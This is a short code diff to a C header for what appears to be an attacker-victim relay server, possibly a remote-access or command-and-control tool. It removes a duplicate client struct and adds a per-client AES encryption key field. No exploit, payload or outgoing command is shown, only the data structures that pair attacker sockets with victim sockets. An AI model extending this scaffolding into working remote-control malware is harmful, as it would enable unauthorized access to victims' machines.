@@ -1,7 +1,9 @@
-#include <stdio.h>
+#include <stdio.h> 
+
 #include <stdlib.h>
 #include <string.h>
 
+#define AES_KEY_LEN 16
 #define HASH_LEN 34
 #define MAX_USER_NAME_LEN 32
 
@@ -10,16 +12,6 @@ typedef enum {
 	VICTIM
 } sender;
 
-//  to delet it
-typedef struct {
-	sender i_am;
-	int socket_fd;
-	int other_side_sfd; // for the attakcer 'other_side_sfd' means the socket file descriptor of his courent victim.
-					   //  for the victim 'other_side_sfd' means the socket file descriptor of his attcker.
-	char id[HASH_LEN];
-	char name[MAX_USER_NAME_LEN];
-} client_delet;
-
 typedef struct client_node {
 	sender i_am;
 	int socket_fd;
@@ -27,6 +19,7 @@ typedef struct client_node {
 					   //  for the victim 'other_side_sfd' means the socket file descriptor of his attcker.
 	char id[HASH_LEN];
 	char name[MAX_USER_NAME_LEN];	
+	char encryption_key[AES_KEY_LEN + 1];
 	struct client_node * next_client;
 } client, * client_ptr;
 
